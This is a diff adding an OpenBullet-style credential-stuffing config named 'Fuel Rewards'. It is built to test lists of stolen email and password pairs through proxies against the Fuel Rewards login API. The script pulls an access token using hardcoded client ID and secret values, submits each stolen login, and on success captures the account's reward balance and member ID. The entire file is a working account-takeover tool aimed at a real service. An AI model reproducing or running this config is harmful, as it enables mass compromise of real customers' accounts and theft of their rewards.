@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Fuel Rewards",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-13T11:57:49.4114464+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST POST "https://restmws.fuelrewards.com/fuelrewards/public/rest/v2/accesstoken" AutoRedirect=TRUE 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "grant_type: access_token" 
+  HEADER "client_id: 9d6c98ad-8242-473a-8181-f804701328fd" 
+  HEADER "client_secret: 1030fd20-928a-4e69-b7e5-3248ad76d8ca" 
+  HEADER "host: restmws.fuelrewards.com" 
+#TOKEN PARSE "<SOURCE>" LR "accessToken\":\"" "\"," Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST_LOGIN REQUEST POST "https://restmws.fuelrewards.com/fuelrewards/public/rest/v2/frnExcentus/login" AutoRedirect=TRUE 
+  CONTENT "{\"userId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "tags: [{\"deviceType\":\"and\",\"deviceModeType\":\"cons\",\"deviceOSVer\":\"5.0.2\",\"DeviceID\":\"GT-I9300\"}]" 
+  HEADER "access_token: <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage" 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+#REWARD_BALANCE PARSE "<SOURCE>" JSON "rewardBalance" Recursive=FALSE -> CAP "REWARD BALANCE" "" "" 
+#MEMBERID PARSE "<SOURCE>" JSON "memberId" Recursive=FALSE -> CAP "MEMBERID" "" "" 
